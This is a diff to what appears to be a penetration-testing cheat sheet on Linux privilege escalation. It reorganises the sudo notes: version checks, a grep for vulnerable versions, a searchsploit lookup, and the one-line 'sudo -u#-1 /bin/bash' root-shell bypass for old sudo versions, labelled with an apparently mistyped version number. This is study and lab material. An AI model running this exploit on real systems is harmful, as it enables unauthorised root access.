@@ -58,11 +58,56 @@ id
 # Spicify a user
 id -u {user}
 ```
+
+### root
+
+Investigate the `/root` directory
+
+```sh
+/root
+```
 <!-- }}} -->
 
 <!-- Sudo {{{-->
 ## Sudo
 
+<!-- Sudo version {{{-->
+### Sudo version
+
+Check `sudo` version
+
+```sh
+sudo --version
+```
+
+```sh
+sudo -V
+```
+<!-- }}} -->
+
+<!-- Sudo vulnerabilities {{{-->
+### Sudo vulnerabilities
+
+Check if `sudo` version is in a vulnerable range
+
+```sh
+sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+```
+
+Search `sudo` version for public exploits
+
+```sh
+searchsploit sudo
+```
+
+`sudo` < v1.28
+
+```sh
+sudo -u#-1 /bin/bash
+```
+<!-- }}} -->
+
+<!-- Sudo commands {{{-->
 ### Sudo commands
 
 Check which commands the current user may run
@@ -78,31 +123,6 @@ sudo -u user /bin/echo Hello World!
 ```
 
 The found command(s) may be exploited with [GTFOBins](https://gtfobins.github.io/)
-
-### Sudo version
-
-Check sudo version for vulnerabilities
-
-```sh
-sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
-```
-
-### Sudo vulnerabilities
-
-Search Sudo version for public exploits
-
-#### Searchsploit
-
-```sh
-searchsploit sudo
-```
-
-#### Sudo < v1.28
-
-Run sudo
-
-```sh
-sudo -u#-1 /bin/bash
-```
 <!-- }}} -->
 
+<!-- }}} -->
